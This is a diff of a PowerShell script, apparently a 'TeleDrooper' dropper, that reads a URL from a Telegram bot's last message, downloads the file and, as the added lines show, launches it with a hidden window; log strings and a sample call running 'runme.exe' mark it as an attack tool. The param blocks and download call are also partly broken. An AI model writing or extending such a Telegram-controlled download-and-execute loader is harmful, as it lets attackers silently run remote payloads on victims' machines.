@@ -25,9 +25,11 @@ function Execute-HTTP-DOWNLOAD-GetCommand()
         [Parameter(Mandatory=$true, Position=0)]
         [string]$FILE
         
-        [Parameter(Mandatory=$true, Position=0)]
+        [Parameter(Mandatory=$true, Position=1)]
         [string]$SAVE
         
+        [Parameter(Mandatory=$true, Position=2)]
+        [string]$RUN
   )
   
   $webRequest = [System.Net.WebRequest]::Create($target)
@@ -43,17 +45,20 @@ function Execute-HTTP-DOWNLOAD-GetCommand()
   
   
   
-  (new-object System.Net.WebClient).DownloadFile( '$url, $path)
+  (new-object System.Net.WebClient).DownloadFile( $FILE, $RUN)
 
-  
+  Start-Process -FilePath $RUN -Wait -WindowStyle Hidden
   
 }
 
 Function Get-File-TeleDrooper{
   Param(
   [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
-  [Parameter(Mandatory=$true,Position=0)] [String[]]$BToken
+  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
+  [Parameter(Mandatory=$true,Position=2)] [String[]]$FSave
+  [Parameter(Mandatory=$true,Position=3)] [String[]]$FRun
 
+ 
   )
   Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"
 
@@ -73,14 +78,18 @@ Function Get-File-TeleDrooper{
 
   Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "
 
-  Write-Host "RUN ME $($LastMessage)"
+  Write-Host "RUN ME $LastMessage"
 
   $TELEFILE = $LastMessage
 
-  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $SAVE
+
+  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $FSave $FRun
 
   Log-Message " [*] END JOB ------------------- ELMO9AWIM "
   
+  Write-Host "RUN ME $FRun HACKER ---------------- EXPLOIT ?.> "
   
   
 }
+
+# Get-File-TeleDrooper -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -FSave "runme.txt" -FRun "runme.exe"
